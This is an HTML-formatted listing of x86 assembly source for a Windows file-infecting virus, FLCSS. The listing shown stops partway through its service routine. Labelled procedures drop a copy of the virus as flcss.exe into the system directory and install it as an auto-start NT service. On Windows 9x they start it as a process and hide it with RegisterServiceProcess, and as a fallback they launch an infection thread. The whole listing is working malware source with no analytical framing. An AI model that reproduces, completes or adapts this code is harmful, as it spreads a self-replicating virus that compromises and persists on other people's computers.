<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>FLCSS.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc2">.386</span><span class="sc0">

</span><span class="sc5">LARGESTACK</span><span class="sc0">

</span><span class="sc10">RADIX</span><span class="sc0">        </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc9">ASSUME</span><span class="sc0">       </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">


</span><span class="sc5">CODE</span><span class="sc0">         </span><span class="sc9">SEGMENT</span><span class="sc0">      </span><span class="sc9">USE32</span><span class="sc0">


             </span><span class="sc9">org</span><span class="sc0">          </span><span class="sc2">100</span><span class="sc0">

</span><span class="sc5">main</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">I</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">          </span><span class="sc2">1000</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">300</span><span class="sc0">
</span><span class="sc5">@</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">          </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VStart</span><span class="sc0">

</span><span class="sc9">INCLUDE</span><span class="sc0">      </span><span class="sc5">HEADER.ASM</span><span class="sc0">


</span><span class="sc5">VStart</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">INCLUDE</span><span class="sc0">      </span><span class="sc5">HEADER.ASM</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; ----------------------------   Startup Code   --------------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">Virus</span><span class="sc0">        </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">NEAR</span><span class="sc0">


             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetVS</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">HostCode</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">movsd</span><span class="sc0">
             </span><span class="sc6">movsd</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">RelocKernel32</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OS</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">],</span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NT_Srv</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">Create9xProcess</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">NT_Srv</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">CreateNTService</span><span class="sc0">
</span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">Virus</span><span class="sc0">                     </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; --------------------   NT Service Creation Routine   -------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">CreateNTService</span><span class="sc0">           </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">PASCAL</span><span class="sc0">       </span><span class="sc10">NEAR</span><span class="sc0">


</span><span class="sc9">LOCAL</span><span class="sc0">        </span><span class="sc5">SCM_Handle</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">


             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">RelocAdvapi32</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">CNT_Failed</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">02</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">               
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">               </span><span class="sc1">; get the service control manager</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">OpenSCManagerA</span><span class="sc0">   </span><span class="sc1">; handler</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">CNT_Failed</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc5">SCM_Handle</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">CreateExecutable</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; if process is running, just exit</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">CNT_Exit</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0F01FF</span><span class="sc0">
             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Service</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">SCM_Handle</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">OpenServiceA</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">CNT_Run</span><span class="sc0">

             </span><span class="sc6">xor</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; -&gt; flcss.exe</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">01</span><span class="sc0">              </span><span class="sc1">; ErrorControl</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">02</span><span class="sc0">              </span><span class="sc1">; Start</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">20</span><span class="sc0">              </span><span class="sc1">; Type</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">SCM_Handle</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">CreateServiceA</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">CNT_Failed</span><span class="sc0">

</span><span class="sc5">CNT_Run</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">StartServiceA</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">CNT_Exit</span><span class="sc0">

</span><span class="sc5">CNT_Failed</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">StartInfectionThread</span><span class="sc0">

</span><span class="sc5">CNT_Exit</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">CreateNTService</span><span class="sc0">           </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; --------------------   W9x Process Creation Routine   ------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">Create9xProcess</span><span class="sc0">           </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">NEAR</span><span class="sc0">


             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">CreateExecutable</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">P9x_Exit</span><span class="sc0">

</span><span class="sc5">P9x_00</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">xor</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">Buffer2</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">040</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">stosd</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">06</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">loop</span><span class="sc0">         </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">CreateProcessA</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">P9x_Exit</span><span class="sc0">

</span><span class="sc5">P9x_Failed</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">StartInfectionThread</span><span class="sc0">

</span><span class="sc5">P9x_Exit</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">Create9xProcess</span><span class="sc0">           </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; ---------------------   flcss.exe Creation Routine   -------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">CreateExecutable</span><span class="sc0">       </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">PASCAL</span><span class="sc0">       </span><span class="sc10">NEAR</span><span class="sc0">


</span><span class="sc9">LOCAL</span><span class="sc0">        </span><span class="sc5">c_FileHandle</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
             </span><span class="sc5">c_BytesWritten</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">

</span><span class="sc10">USES</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">


             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">104</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">             </span><span class="sc6">stosb</span><span class="sc0">
             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Process</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">movsd</span><span class="sc0">
             </span><span class="sc6">movsd</span><span class="sc0">
             </span><span class="sc6">movsd</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">02</span><span class="sc0">           </span><span class="sc1">; create always</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">OpenFile</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">CE_Exit</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc5">c_FileHandle</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">VImports</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; clean main import table</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
             </span><span class="sc6">stosd</span><span class="sc0">
             </span><span class="sc6">stosd</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">Kernel32_Relocated</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; restore 2nd imp. table</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; (necessary for NT)</span><span class="sc0">
             </span><span class="sc6">stosd</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">c_BytesWritten</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">0200</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">ebx</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">c_FileHandle</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">WriteFile</span><span class="sc0">                 </span><span class="sc1">; write header</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">Phys_VSize</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">ebx</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">c_FileHandle</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">WriteFile</span><span class="sc0">                 </span><span class="sc1">; write vrs</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">c_FileHandle</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">CE_Exit</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">inc</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">CreateExecutable</span><span class="sc0">          </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; ---------------------------   Viral Service   --------------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">VService</span><span class="sc0">                  </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">NEAR</span><span class="sc0">


             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetVS</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">RelocKernel32</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc5">VS_Exit</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OS</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">],</span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">W9x_Service_Register</span><span class="sc0">


</span><span class="sc5">WNT_Service_Hacknowledge</span><span class="sc4">:</span><span class="sc0">


             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">RelocAdvapi32</span><span class="sc0">
             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc5">VS_Exit</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">

             </span><span class="sc6">xor</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">Service</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ServiceDispatcher</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0C</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; give control back to caller</span><span class="sc0">
                                               </span><span class="sc1">; and jump to dispatcher  </span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">StartServiceCtrlDispatcherA</span><span class="sc0">


</span><span class="sc5">W9x_Service_Register</span><span class="sc4">:</span><span class="sc0">


             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">USER32_Name</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">LoadLibraryA</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">RegisterClassA</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetProcAddress</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">VS_00</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">06</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0A</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">stosd</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; ? (must be &lt;&gt; 0)</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">],</span><span class="sc2">400000</span><span class="sc0">   </span><span class="sc1">; image base</span><span class="sc0">
             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Service</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">RegisterClassA</span><span class="sc0">      </span><span class="sc1">; necessary, or RSP won't work</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">RegisterServiceProcess</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
